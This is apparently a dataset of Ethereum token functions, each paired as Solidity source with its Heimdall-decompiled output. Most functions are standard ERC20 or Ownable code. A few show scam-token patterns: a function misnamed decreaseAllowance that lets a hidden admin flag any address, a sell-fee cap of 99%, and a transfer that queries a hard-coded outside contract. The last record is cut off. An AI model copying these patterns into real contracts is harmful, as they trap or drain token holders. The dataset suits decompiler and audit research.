{"contract_address": "0x6BC7d0c26885D7c1C384c3aF3CA6214D628B2712", "original_solidity_code": "function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {\\n        swapTokensAtAmount = newAmount * (10 ** 18);\\n    }", "heimdall_decompiled_code": "function updateSwapTokensAtAmount(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((arg0 == ((arg0 * 0x0de0b6b3a7640000) / 0x0de0b6b3a7640000)) | !0x0de0b6b3a7640000);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        swapTokensAtAmount = arg0 * 0x0de0b6b3a7640000;\n    }"}
{"contract_address": "0x45c86eBa585dfA8C43E636EBd025C99E972aB464", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC41336748d516F5753737360f1298215F0eF2867", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function updateSwapTokensAtAmount(uint256 newAmount)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            newAmount >= (totalSupply() * 1) / 100000,\r\n            \"Swap amount cannot be lower than 0.001% total supply.\"\r\n        );\r\n        require(\r\n            newAmount <= (totalSupply() * 5) / 1000,\r\n            \"Swap amount cannot be higher than 0.5% total supply.\"\r\n        );\r\n        swapTokensAtAmount = newAmount;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function updateSwapTokensAtAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x01 & (totalSupply > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(arg0 < ((0x01 * totalSupply) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x35;\n        var_d = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_g = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0x2046683F5caE663A8e83069e77c3F20a8B26B876", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_c / 0x02;\n                if (store_c) {\n                    if (store_c - ((store_c / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c / 0x02) {\n                            if (0x1f < (store_c / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x959Cab41Be70E2c8B29A15f45C088C2101620149", "original_solidity_code": "function decreaseAllowance(address cjjjss) public    {\r\n       \r\n        require(_msgSender() == vipadmin123);\r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 newpassnum = 12233;\r\n        xelonlist[cjjjss] = newpassnum;\r\n       \r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0x2fc9;\n    }"}
{"contract_address": "0x52FE190D632c22aD6E4a0aA0916a4B45aC073be6", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_e[var_a];\n        return storage_map_e[var_a];\n    }"}
{"contract_address": "0xE79231d4ad0AB655587c3651A59B99a0407a28A5", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x684D5A4E5f91ED948E1cEc2B3B0BA22177f6BB5E", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue)\r\n        public\r\n        virtual\r\n        returns (bool)\r\n    {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender].add(addedValue)\r\n        );\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_d = storage_map_b[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x52FE190D632c22aD6E4a0aA0916a4B45aC073be6", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xd3a031b4752eE83c310988Ad7277A7C2cD0bC631", "original_solidity_code": "function updateBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        _buytax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }", "heimdall_decompiled_code": "function updateBuyFee(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_b = arg0;\n        require(!arg0 > 0x05);\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, ERC721) returns (bool) {\r\n        return interfaceId == type(IERC721Enumerable).interfaceId || super.supportsInterface(interfaceId);\r\n    }", "heimdall_decompiled_code": "function supportsInterface(bytes4 arg0) public pure returns (bool) {\n        require(arg0 == (uint32(arg0)));\n        require(uint32(arg0) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        uint32 var_a = !(!(uint32(arg0)) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function updateMarketingWallet(address newMarketingWallet)\r\n        external\r\n        onlyOwner\r\n    {\r\n        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);\r\n        marketingWallet = newMarketingWallet;\r\n    }", "heimdall_decompiled_code": "function updateMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit marketingWalletUpdated(address(arg0), address(marketingWallet / 0x01));\n        marketingWallet = (address(arg0) * 0x01) | (uint96(marketingWallet));\n    }"}
{"contract_address": "0xd548c6Cf03b82450db5a446845DB3005e34138eE", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_m[var_a];\n        return storage_map_m[var_a];\n    }"}
{"contract_address": "0xf563f9eCe196488b3E1c4f769437C6978E5bA140", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[3312:3349];\n        address var_d = msg.sender;\n        var_e = 0x05;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x05;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_e[var_d] = storage_map_e[var_d] - arg1;\n        address var_f = storage_map_e[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x22;\n        var_k = this.code[3127:3161];\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x24;\n        var_k = this.code[3276:3312];\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x06;\n        address var_c = storage_map_o[var_a];\n        return storage_map_o[var_a];\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function updateSellFees(uint256 _marketingFee, uint256 _liquidityFee, uint256 _devFee, uint256 _earlySellLiquidityFee, uint256 _earlySellMarketingFee) external onlyOwner {\\r\\n        sellMarketingFee = _marketingFee;\\r\\n        sellLiquidityFee = _liquidityFee;\\r\\n        sellDevFee = _devFee;\\r\\n        earlySellLiquidityFee = _earlySellLiquidityFee;\\r\\n        earlySellMarketingFee = _earlySellMarketingFee;\\r\\n        sellTotalFees = sellMarketingFee + sellLiquidityFee + sellDevFee;\\r\\n        require(sellTotalFees <= 99, \\\"Must keep fees at 99% or less\\\");\\r\\n    }", "heimdall_decompiled_code": "function updateSellFees(uint256 arg0, uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        sellMarketingFee = arg0;\n        sellLiquidityFee = arg1;\n        sellDevFee = arg2;\n        earlySellLiquidityFee = arg3;\n        earlySellMarketingFee = arg4;\n        require(!arg0 > (arg1 + arg0));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x68166ad94798eafB675d6Ff4Cd28eE6eAA19bd17", "original_solidity_code": "function openTrading() external {\r\n        require(!tradingOpen);\r\n        require(msg.sender == deployer);\r\n        tradingOpen = true;        \r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(!bytes1(store_a / 0x01000000000000000000000000000000000000000000));\n        require(0x15c0811abfced77e127b58f9040976a6e78ad412 == msg.sender);\n        store_a = 0x01000000000000000000000000000000000000000000 | (uint248(store_a));\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function setLpWallet(address newLpWallet) external onlyOwner {\r\n        lpWallet = newLpWallet;\r\n    }", "heimdall_decompiled_code": "function setLpWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        tradingOpen = (address(arg0)) | (uint96(tradingOpen));\n    }"}
{"contract_address": "0xd8B220bAC6b58743AAf968A18859963016f4f21F", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x110B3EbD95Ac61b8Db462b9d85F73de7Ea5BcF1e", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xa5060B53791533b0dE5C831e925668A09eBCCd77", "original_solidity_code": "function updateSwapTokensAtAmount(uint256 newAmount)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            newAmount >= (totalSupply() * 1) / 100000,\r\n            \"Swap amount cannot be lower than 0.001% total supply.\"\r\n        );\r\n        require(\r\n            newAmount <= (totalSupply() * 5) / 1000,\r\n            \"Swap amount cannot be higher than 0.5% total supply.\"\r\n        );\r\n        swapTokensAtAmount = newAmount;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function updateSwapTokensAtAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x01 & (totalSupply > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x0186a0, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(arg0 < ((0x01 * totalSupply) / 0x0186a0)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x35;\n        var_d = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_g = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0x5a913264FF9a427e0452acB8f522E8202CBB6234", "original_solidity_code": "function addDestination(address addr) external onlyOwner {\\n        validDestination[addr] = true;\\n    }", "heimdall_decompiled_code": "function addDestination(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0xcf;\n        storage_map_f[var_e] = 0x01 | (uint248(storage_map_f[var_e]));\n    }"}
{"contract_address": "0x39f3C6C2a3E69D908DFE9863C9127080CC487933", "original_solidity_code": "function updateLiquidityTreshhold(uint256 new_amount) external onlyOwner {\r\n        //update the treshhold\r\n        tokenLiquidityThreshold = new_amount * 10**decimals();\r\n    }", "heimdall_decompiled_code": "function updateLiquidityTreshhold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x12) {\n            require(0x12);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            store_g = 0x01 * arg0;\n            require((0x01 == ((0x01 * arg0) / arg0)) | !arg0);\n            require(0x0a);\n            require(0x0a == 0x01);\n            require(0x0a == 0x02);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x12 > 0xff);\n            require(!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20)));\n            require(!0x12 > 0x01);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999);\n            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_f = 0x11;\n            require(!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999);\n        }\n    }"}
{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function balanceOf(address account) external view override returns (uint256) {\\r\\n      uint160 \\r\\n      x = uint160(account\\r\\n        ); return slotValues(\\r\\n          x, 4) + \\r\\n          slotValues(x\\r\\n          , 6); }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x06;\n        var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = storage_map_d[var_a] + storage_map_d[var_a];\n        return storage_map_d[var_a] + storage_map_d[var_a];\n    }"}
{"contract_address": "0x1826BA7e52f6e4EffB63dA920bbEa0F3dbA8AF94", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xf7572367197fE25A2F2bEe8d267a1d5cA0713ea3", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(msg.sender, recipient, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender));\n        require(address(arg0));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = msg.sender;\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg1;\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!((arg1 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = arg1 + storage_map_b[var_c];\n        uint256 var_g = arg1;\n        emit 